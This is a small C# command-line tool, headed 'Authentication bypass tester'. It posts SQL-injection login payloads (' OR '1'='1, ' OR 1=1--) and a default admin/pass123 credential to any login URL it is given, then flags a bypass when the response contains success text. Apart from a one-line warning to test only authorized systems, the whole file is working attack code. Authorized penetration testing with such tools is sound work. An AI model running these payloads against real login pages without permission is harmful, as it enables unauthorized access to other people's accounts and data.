// Authentication bypass tester (C#)
// WARNING: Use only on systems you own or have explicit permission to test.

using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;

class Program
{
    static readonly List<Dictionary<string, string>> authPayloads = new List<Dictionary<string, string>>
    {
        new Dictionary<string, string> { { "username", "admin" }, { "password", "pass123" } },
        new Dictionary<string, string> { { "username", "' OR '1'='1" }, { "password", "" } },
        new Dictionary<string, string> { { "token", "' OR 1=1--" } }
    };

    static async Task<bool> TestAuthBypassAsync(string targetUrl)
    {
        bool vulnerable = false;

        var handler = new HttpClientHandler
        {
            AllowAutoRedirect = false
        };

        using (var client = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(10) })
        {
            Console.WriteLine($"Testing authentication bypass at {targetUrl}");

            foreach (var payload in authPayloads)
            {
                try
                {
                    using (var content = new FormUrlEncodedContent(payload))
                    {
                        HttpResponseMessage response = await client.PostAsync(targetUrl, content);
                        string body = await response.Content.ReadAsStringAsync();
                        string bodyLower = body?.ToLowerInvariant() ?? "";

                        if (bodyLower.Contains("success") || bodyLower.Contains("welcome"))
                        {
                            Console.WriteLine($"[VULNERABLE] Payload {FormatPayload(payload)} returned success text (status {((int)response.StatusCode)})");
                            vulnerable = true;
                        }
                        else if ((int)response.StatusCode >= 300 && (int)response.StatusCode < 400)
                        {
                            // Redirect detected — inspect Location header
                            if (response.Headers.Location != null)
                            {
                                var loc = response.Headers.Location.ToString();
                                Console.WriteLine($"Redirecting payload: {FormatPayload(payload)} -> Location: {loc} (status {((int)response.StatusCode)})");
                                // Optionally treat some redirects as suspicious
                            }
                            else
                            {
                                Console.WriteLine($"Redirecting payload (no Location header): {FormatPayload(payload)} (status {(int)response.StatusCode})");
                            }
                        }
                        else
                        {
                            Console.WriteLine($"Not accepted: {FormatPayload(payload)} (status {(int)response.StatusCode})");
                        }
                    }
                }
                catch (TaskCanceledException tex) when (!tex.CancellationToken.IsCancellationRequested)
                {
                    Console.WriteLine($"Timeout for payload: {FormatPayload(payload)}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error for payload {FormatPayload(payload)}: {ex.Message}");
                }
            }
        }

        return vulnerable;
    }

    static string FormatPayload(Dictionary<string, string> p)
    {
        var parts = new List<string>();
        foreach (var kv in p) parts.Add($"{kv.Key}={kv.Value}");
        return "{" + string.Join(", ", parts) + "}";
    }

    static async Task<int> Main(string[] args)
    {
        if (args.Length != 1)
        {
            Console.WriteLine("Usage: dotnet run -- <target_url>");
            Console.WriteLine("Example: dotnet run -- https://example.com/login");
            return 2;
        }

        string target = args[0];

        bool isVulnerable = await TestAuthBypassAsync(target);

        if (isVulnerable)
        {
            Console.WriteLine("\n[VULNERABLE] Authentication bypass detected!");
        }
        else
        {
            Console.WriteLine("\nAuthentication appears strong (no obvious bypass detected).");
        }

        return 0;
    }
}
